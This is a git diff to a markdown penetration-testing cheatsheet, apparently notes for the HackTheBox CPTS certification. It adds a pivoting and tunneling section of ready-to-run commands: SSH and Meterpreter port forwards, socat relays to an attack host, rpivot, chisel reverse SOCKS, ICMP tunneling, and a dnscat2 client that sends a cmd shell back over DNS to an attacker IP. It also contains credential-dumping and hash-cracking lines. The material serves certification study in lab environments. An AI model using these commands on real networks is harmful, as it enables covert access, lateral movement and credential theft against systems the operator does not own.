@@ -50,11 +50,11 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking RDP Services](#attacking-rdp-services)
     - [Attacking DNS Services](#attacking-dns-services)
     - [Attacking Email Services](#attacking-email-services)
-- [Pivoting, Tunneling, and Port Forwarding](#port-forwarding)
+- [Pivoting, Tunneling, and Port Forwarding](#pivoting,-tunneling,-and-port-forwarding)
     - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
     - [Remote/Reverse Port Forwarding with SSH](#remote/reverse-port-forwarding-with-ssh)
-    - [Meterpreter Tunneling & Port Forwarding](#port-forwarding-with-meterpreter)
-    - [Socat Redirection with a Reverse Shell / Bind Shell](#pass-the-certificate)
+    - [Port Forwarding with Meterpreter](#port-forwarding-with-meterpreter)
+    - [Pass the Certificate](#pass-the-certificate)
 - [Active Directory](#active-directory)
     - [Initial Enumeration](#initial-enumeration)
     - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
@@ -978,7 +978,7 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 # Testing the SMTP service for the open-relay vulnerability.
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213  
 ```
-## Port Forwarding
+## Pivoting, Tunneling, and Port Forwarding
 
 #### Dynamic Port Forwarding with SSH and SOCKS Tunneling
 ```
@@ -995,12 +995,116 @@ or
 ssh -D 1080 ubuntu@<IPaddressofTarget>
 /etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
 ```
-##### Dynamic Port Forwarding with SSH and SOCKS Tunneling
+##### Remote/Reverse Port Forwarding with SSH
 ```
-# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
-hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+# SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.
+ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN
 ```
+##### Meterpreter Tunneling & Port Forwarding
+```
+# Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. (Bind Shell)
+meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>
 
+# Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host. (Reverse Shell)
+meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>
+```
+##### Socat Redirection with a Reverse Shell / Bind Shell
+```
+# Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. (Reverse Shell)
+socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+
+# Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. (Bind Shell)
+socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443
+```
+##### SSH for Windows: plink.exe
+```
+# Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.
+plink -D 9050 ubuntu@<IPaddressofTarget>
+```
+##### SSH Pivoting with Sshuttle
+```
+# Uses apt-get to install the tool sshuttle.
+sudo apt-get install sshuttle
+
+# Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).
+sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+```
+##### Web Server Pivoting with Rpivot
+```
+# Cloning rpivot
+git clone https://github.com/klsecservices/rpivot.git
+sudo apt-get install python2.7
+curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
+echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+source ~/.bashrc
+pyenv install 2.7
+pyenv shell 2.7
+
+# Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+# Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).
+python2.7 client.py --server-ip <IPaddressofAttackHost> --server-port 9999
+
+# Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+```
+##### Port Forwarding with Windows Netsh
+```
+# Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
+
+# Windows-based command used to view the configurations of a portproxy rule called v4tov4.
+netsh.exe interface portproxy show v4tov4
+```
+##### DNS Tunneling with Dnscat2
+```
+# Clones the dnscat2 project GitHub repository.
+git clone https://github.com/iagox86/dnscat2.git
+
+# Used to start the dnscat2.rb server running on the specified IP address, port (53) & using the domain inlanefreight.local with the no-cache option enabled.
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+# Clones the dnscat2-powershell project Github repository.
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+# PowerShell command used to import the dnscat2.ps1 tool.
+Import-Module .\dnscat2.ps1
+
+# PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+##### SOCKS5 Tunneling with Chisel
+```
+# Clones the chisel project GitHub repository.
+git clone https://github.com/jpillora/chisel.git ; cd chisel ; go build
+
+# Running the Chisel Server on the Pivot Host and Connecting to the Chisel Server
+./chisel server -v -p 1234 --socks5                     ( run on Pivot Host)
+./chisel client -v 10.129.202.64:1234 socks             ( run on attack Host)
+/etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
+
+# Chisel Reverse Pivot ,  Starting the Chisel Server on our Attack Host 
+sudo ./chisel server --reverse -v -p 1234 --socks5                   ( run on attack Host)
+./chisel client -v 10.10.14.17:1234 R:socks                          ( run on Pivot Host)
+/etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
+```
+##### ICMP Tunneling with SOCKS
+```
+# Clones the ptunnel-ng project GitHub repository and Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.
+git clone https://github.com/utoni/ptunnel-ng.git ; sudo ./autogen.sh 
+
+# Starting the ptunnel-ng Server on the Target Host
+sudo ./ptunnel-ng -r10.129.202.64 -R22
+
+# Connecting to ptunnel-ng Server from Attack Host
+sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+
+# Enabling Dynamic Port Forwarding over SSH
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+```
 ## Active Directory
 
 #### Initial Enumeration
@@ -1561,7 +1665,6 @@ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'a
 
 # import file Administrator.ccache  to dump ntlm 
 KRB5CCNAME=Administrator.ccache impacket-secretsdump  -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
-Metasploit
 
 # AS-REP Roasting with account svc-alfresco ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack )  
 impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.95.210 -no-pass
@@ -1584,6 +1687,14 @@ use auxiliary/admin/mssql/mssql_enum_domain_accounts
 # MSSQL Ping in Metasploit
 use scanner/mssql/mssql_ping
 
+# Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23).
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+# Metasploit command that selects the socks_proxy auxiliary module.
+use auxiliary/server/socks_proxy
+
+# Metasploit command used to select the autoroute module.
+use post/multi/manage/autoroute
 ```
 ## smbclient
 
